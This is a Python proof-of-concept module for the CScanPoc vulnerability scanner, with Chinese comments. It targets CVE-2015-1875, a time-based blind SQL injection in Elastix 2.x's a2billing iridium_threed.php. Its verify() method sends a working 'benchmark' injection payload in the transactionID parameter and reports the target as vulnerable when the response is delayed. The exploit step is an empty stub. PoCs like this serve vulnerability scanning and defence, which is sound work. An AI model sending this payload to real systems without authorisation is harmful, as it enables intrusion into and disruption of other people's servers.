# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import time

class Vuln(ABVuln):
    vuln_id = 'Elastix_0001' # 平台漏洞编号，留空
    name = 'Elastix 2.x SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-03-07'  # 漏洞公布时间
    desc = '''
        Vulnerable Source Code snippet in "a2billing/customer/iridium_threed.php".
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/36305/'  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = 'CVE-2015-1875'  # cve编号
    product = 'Elastix'  # 漏洞应用名称
    product_version = '2.x'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '5cb67dae-9e95-429f-bf42-99d42adc6e2f'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            verify_url = self.target + '/a2billing/customer/iridium_threed.php'
            payload = '?transactionID=-1 and 1=benchmark(2000000,md5(1))'
            start_time = time.time()

            req = requests.get(verify_url + payload)
            if req.status_code == 200 and time.time() - start_time > 5:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
